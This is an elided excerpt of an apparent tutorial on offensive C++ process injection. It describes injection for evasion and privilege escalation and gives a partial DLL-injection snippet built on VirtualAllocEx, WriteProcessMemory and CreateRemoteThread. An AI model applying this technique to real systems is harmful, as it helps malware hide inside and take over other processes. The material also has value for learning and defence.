---
title: "Offensive Development with C++: Process Injection Techniques"  
...
In offensive security, **process injection** is a key technique used to execute malicious payloads inside the address space of another process. This technique is widely leveraged for evasion, privilege escalation, and persistence. In this article, we will explore three major process injection methods in **C++**:
...
**Make Executable**: The VirtualProtect function changes the memory permissions to executable.
...
## **2. Remote Injection**
This is my favorite, Remote injection involves injecting shellcode into another running process. This is useful for **privilege escalation** and **stealth execution**.
...
**🔹 Risks:**  
❌ Requires sufficient privileges to write into another process  
...
int main() {
    ...
    LPVOID alloc_mem = VirtualAllocEx(hProcess, NULL, strlen(dllPath) + 1, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    WriteProcessMemory(hProcess, alloc_mem, dllPath, strlen(dllPath) + 1, NULL);
    HANDLE hThread = CreateRemoteThread(hProcess, NULL, 0, (LPTHREAD_START_ROUTINE)LoadLibraryA, alloc_mem, 0, NULL);
    CloseHandle(hThread);
...
https://malapi.io/winapi/LoadLibraryA 